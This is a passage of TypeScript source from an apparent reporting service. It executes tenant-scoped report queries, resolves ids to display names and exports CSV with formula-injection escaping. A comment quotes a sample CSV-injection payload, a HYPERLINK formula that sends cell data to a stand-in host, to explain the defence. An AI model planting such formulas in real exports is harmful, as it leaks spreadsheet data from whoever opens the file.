  const fn = a.fn.charAt(0).toUpperCase() + a.fn.slice(1);
  return `${fn} of ${a.def.label}`;
}

function aggregateType(a: ResolvedAggregation): ReportColumnType {
  if (a.fn === "count" || a.fn === "sum" || a.fn === "avg") return "number";
  return a.def.type === "number" ? "number" : a.def.type;
}

export interface ExecutionScope {
  companyId: string;
  /** applied when the report (or the run) is project-scoped */
  projectId?: string | null;
  /**
   * Row-level security for a run that names NO project (#751). `null` means
   * unrestricted — the caller reaches every project in the company (owner /
   * admin / company-wide assurance grant). An ARRAY restricts a project-scoped
   * dataset to exactly those projects; an EMPTY array therefore returns
   * nothing, which is the correct answer for a user who is on no project.
   * Without this a company member could omit `projectId` and read every
   * project's rows — the exact door the project-scoped path already closes.
   */
  projectIds?: readonly string[] | null;
}

export interface ExecutionWindow {
  /** rows to return; clamped to the definition's limitRows */
  pageSize: number;
  offset: number;
}

export interface ExecutionResultColumn {
  key: string;
  label: string;
  type: ReportColumnType;
}

export interface ExecutionResult {
  dataset: ReportDataset;
  columns: ExecutionResultColumn[];
  rows: Record<string, unknown>[];
  rowCount: number;
  /** more matching rows exist than were returned (page cap or limitRows cap) */
  truncated: boolean;
  limitRows: number;
  offset: number;
  executedAt: string;
  ms: number;
  /** projected columns withheld by the caller's level — never silently blank */
  hiddenColumns?: string[];
}

/**
 * Resolve the ids of the page just returned to display names, one bounded
 * query per lookup table. Company-scoped: a lookup can never reach out of the
 * tenant, and an id with no row resolves to null (rendered as an em-dash),
 * never to a guess.
 */
async function resolveLookups(
  db: Db,
  companyId: string,
  columns: ResolvedColumn[],
  rows: Record<string, unknown>[],
): Promise<ExecutionResultColumn[]> {
  const lookupCols = columns.filter((c) => c.def.lookup);
  if (lookupCols.length === 0 || rows.length === 0) return [];
  const idsByLookup = new Map<LookupKey, Set<string>>();
  for (const c of lookupCols) {
    const set = idsByLookup.get(c.def.lookup!) ?? new Set<string>();
    for (const r of rows) {
      const v = r[c.key];
      if (typeof v === "string" && v.length > 0) set.add(v);
    }
    idsByLookup.set(c.def.lookup!, set);
  }
  const names = new Map<string, Map<string, string>>();
  for (const [kind, ids] of idsByLookup) {
    const map = new Map<string, string>();
    const list = [...ids].slice(0, 1000);
    if (list.length > 0) {
      if (kind === "user") {
        // Users are global rows, so the tenancy check is the id set itself:
        // the ids came out of this company's own records.
        const found = await db
          .select({ id: users.id, name: users.name })
          .from(users)
          .where(inArray(users.id, list));
        for (const u of found) map.set(u.id, u.name);
      } else {
        const found = await db
          .select({ id: vendors.id, name: vendors.name })
          .from(vendors)
          .where(and(eq(vendors.companyId, companyId), inArray(vendors.id, list)));
        for (const v of found) map.set(v.id, v.name);
      }
    }
    names.set(kind, map);
  }
  const extra: ExecutionResultColumn[] = [];
  for (const c of lookupCols) {
    const key = `${c.key}__label`;
    extra.push({ key, label: `${c.def.label} (name)`, type: "string" });
    const map = names.get(c.def.lookup!)!;
    for (const r of rows) {
      const v = r[c.key];
      r[key] = typeof v === "string" ? (map.get(v) ?? null) : null;
    }
  }
  return extra;
}

/**
 * Execute a resolved report. Scope predicates are appended here, from the
 * caller's request context — a definition cannot widen them.
 */
export async function executeReport(
  db: Db,
  plan: ResolvedReport,
  scope: ExecutionScope,
  window: ExecutionWindow,
  options: { hiddenColumns?: string[] } = {},
): Promise<ExecutionResult> {
  const startedAt = Date.now();
  const ds = plan.dataset;

  const clauses: SQL[] = [];
  // 1. tenancy, ALWAYS, and always first.
  clauses.push(eq(ds.companyColumn, scope.companyId as never));
  if (ds.projectColumn && scope.projectId) {
    clauses.push(eq(ds.projectColumn, scope.projectId as never));
  } else if (ds.projectColumn && scope.projectIds) {
    // Company-wide run by a caller who does not reach every project: narrow to
    // the ones they do. `false` rather than an empty IN () for the no-project
    // case, which Postgres would reject.
    clauses.push(
      scope.projectIds.length === 0
        ? sql`false`
        : inArray(ds.projectColumn, scope.projectIds as never[]),
    );
  }
  // 2. the definition's own filters, ANDed beneath the scope.
  for (const f of plan.filters) clauses.push(filterPredicate(f));

  const selection: Record<string, AnyPgColumn | SQL> = {};
  const outColumns: ExecutionResultColumn[] = [];
  const orderable = new Map<string, AnyPgColumn | SQL>();

  if (plan.isAggregate) {
    if (plan.groupBy) {
      selection[plan.groupBy.key] = plan.groupBy.def.column;
      orderable.set(plan.groupBy.key, plan.groupBy.def.column);
      outColumns.push({
        key: plan.groupBy.key,
        label: plan.groupBy.def.label,
        type: plan.groupBy.def.type,
      });
    }
    for (const a of plan.aggregations) {
      const expr = aggregateExpression(a);
      selection[a.alias] = expr;
      orderable.set(a.alias, expr);
      outColumns.push({ key: a.alias, label: aggregateLabel(a), type: aggregateType(a) });
    }
  } else {
    for (const c of plan.columns) {
      selection[c.key] = c.def.column;
      orderable.set(c.key, c.def.column);
      outColumns.push({ key: c.key, label: c.def.label, type: c.def.type });
    }
  }

  const offset = Math.max(0, Math.trunc(window.offset));
  const want = Math.max(0, Math.min(Math.trunc(window.pageSize), plan.limitRows - offset));

  let rawRows: Record<string, unknown>[] = [];
  if (want > 0) {
    let qb = db
      .select(selection)
      .from(ds.table)
      .where(and(...clauses))
      .$dynamic();
    if (plan.groupBy) qb = qb.groupBy(plan.groupBy.def.column);
    // Row mode may sort on any registered column, projected or not; aggregate
    // mode may only sort on the grouped column or an aggregate expression.
    let sortExpr: AnyPgColumn | SQL | undefined;
    if (plan.isAggregate) {
      if (plan.sortBy) sortExpr = orderable.get(plan.sortBy);
    } else {
      sortExpr = ds.columns[plan.sortBy ?? ds.defaultSort]?.column;
    }
    if (sortExpr) qb = qb.orderBy(plan.sortDir === "asc" ? asc(sortExpr) : desc(sortExpr));
    qb = qb.limit(want + 1).offset(offset);
    rawRows = (await qb) as Record<string, unknown>[];
  }

  const truncated = rawRows.length > want;
  const kept = truncated ? rawRows.slice(0, want) : rawRows;

  // Numeric aggregates come back from the driver as strings on some paths;
  // normalize so the client never has to guess.
  const numericKeys = new Set(outColumns.filter((c) => c.type === "number").map((c) => c.key));
  const rows = kept.map((r) => {
    const out: Record<string, unknown> = {};
    for (const c of outColumns) {
      const v = r[c.key];
      out[c.key] = numericKeys.has(c.key) && v !== null && v !== undefined ? Number(v) : (v ?? null);
    }
    return out;
  });

  // Reference ids become names AFTER the page is fetched: bounded by the page,
  // never a join, and never able to widen the tenancy predicate.
  if (!plan.isAggregate && rows.length > 0) {
    const extra = await resolveLookups(db, scope.companyId, plan.columns, rows);
    outColumns.push(...extra);
  }

  return {
    dataset: ds.key,
    columns: outColumns,
    rows,
    rowCount: rows.length,
    truncated,
    limitRows: plan.limitRows,
    offset,
    executedAt: new Date().toISOString(),
    ms: Date.now() - startedAt,
    ...(options.hiddenColumns && options.hiddenColumns.length > 0
      ? { hiddenColumns: options.hiddenColumns }
      : {}),
  };
}

/* ------------------------------------------------------------------ */
/* CSV (#738)                                                          */
/* ------------------------------------------------------------------ */

/**
 * Characters that make a spreadsheet treat a cell as a FORMULA rather than
 * text. A subcontractor who names an RFI `=HYPERLINK("http://evil.example"&A1)`
 * is writing code that runs in the owner's Excel when the owner exports the
 * RFI ageing report — the classic CSV injection, and the export path is exactly
 * where lower-trust text meets a higher-trust reader.
 */
const CSV_FORMULA_TRIGGERS = new Set(["=", "+", "-", "@", "\t", "\r"]);

export function csvEscape(value: unknown): string {
  let s = value === null || value === undefined ? "" : String(value);
  // Neutralise, do not strip: the reader must still see what was written, so
  // the cell is prefixed with an apostrophe (OWASP guidance) which spreadsheets
  // consume as "this is text".
  //
  // A NUMBER IS NEVER NEUTRALISED. Injection needs a string an untrusted party
  // authored; a negative amount is not that, and prefixing -1200.5 with an
  // apostrophe turns money into text in every spreadsheet and every importer
  // that reads the file — a variance column would stop summing.
  const numeric = typeof value === "number" || typeof value === "bigint";
  if (!numeric && s.length > 0 && CSV_FORMULA_TRIGGERS.has(s[0]!)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Header row of column labels, then one line per row, CRLF-safe. */
export function resultToCsv(result: ExecutionResult): string {
  const lines = [result.columns.map((c) => csvEscape(c.label)).join(",")];
  for (const row of result.rows) {
    lines.push(result.columns.map((c) => csvEscape(row[c.key])).join(","));
  }
  return `${lines.join("\n")}\n`;
}
